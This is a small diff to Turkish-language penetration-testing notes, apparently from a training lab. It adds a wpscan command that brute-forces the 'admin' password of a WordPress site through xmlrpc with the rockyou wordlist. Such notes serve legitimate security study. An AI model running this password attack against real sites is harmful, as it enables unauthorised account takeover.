@@ -1,3 +1,8 @@
+**hedef site üzerinde `xmlrpc` ile brute-force**
+
+```bash
+wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+```
 hedef site üzerinde kullanılan pluginleri bulma
 
 ```bash
